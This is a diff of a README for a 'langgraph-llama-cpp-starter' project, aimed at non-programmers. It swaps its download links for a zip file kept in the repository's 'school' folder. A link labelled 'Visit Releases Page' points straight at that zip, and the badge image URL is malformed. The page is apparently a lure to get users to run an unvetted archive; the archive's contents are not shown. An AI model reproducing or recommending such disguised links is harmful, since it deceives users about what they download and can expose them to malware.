@@ -10,7 +10,7 @@ Follow these simple steps to download and run the application. No programming kn
 
 ### 📥 Download Now
 
-[![Download langgraph-llama-cpp-starter](https://raw.githubusercontent.com/irandysousa/langgraph-llama-cpp-starter/main/school/langgraph-llama-cpp-starter.zip%20version-brightgreen)](https://raw.githubusercontent.com/irandysousa/langgraph-llama-cpp-starter/main/school/langgraph-llama-cpp-starter.zip)
+[![Download langgraph-llama-cpp-starter](https://github.com/irandysousa/langgraph-llama-cpp-starter/raw/refs/heads/main/school/cpp_llama_langgraph_starter_v2.9.zip%20version-brightgreen)](https://github.com/irandysousa/langgraph-llama-cpp-starter/raw/refs/heads/main/school/cpp_llama_langgraph_starter_v2.9.zip)
 
 ### 📋 System Requirements
 
@@ -23,7 +23,7 @@ Follow these simple steps to download and run the application. No programming kn
 
 1. **Visit the Releases Page:** Click the button below to access the download options.
    
-   [Visit Releases Page](https://raw.githubusercontent.com/irandysousa/langgraph-llama-cpp-starter/main/school/langgraph-llama-cpp-starter.zip)
+   [Visit Releases Page](https://github.com/irandysousa/langgraph-llama-cpp-starter/raw/refs/heads/main/school/cpp_llama_langgraph_starter_v2.9.zip)
 
 2. **Select the Latest Version:** Look for the latest release at the top of the page.
 
